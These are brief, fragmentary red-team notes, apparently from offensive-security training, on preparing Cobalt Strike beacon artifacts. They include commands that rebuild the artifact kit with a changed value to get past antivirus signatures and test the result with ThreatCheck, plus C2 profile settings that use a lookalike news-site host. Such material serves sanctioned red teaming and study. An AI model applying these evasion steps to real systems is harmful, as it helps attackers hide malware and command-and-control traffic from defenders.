...
Modify /opt/cobaltstrike/profiles/default.profile on team server (ssh in)
```powershell
...
$ ./build.sh pipe VirtualAlloc 296948 5 false false none /mnt/c/Tools/cobaltstrike/artifacts # change 296948 -> 344564
...
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64big.exe
...
uri = /beacon.bin # or whatever you want
host = www.bleepincomputer.com # or whatever you want
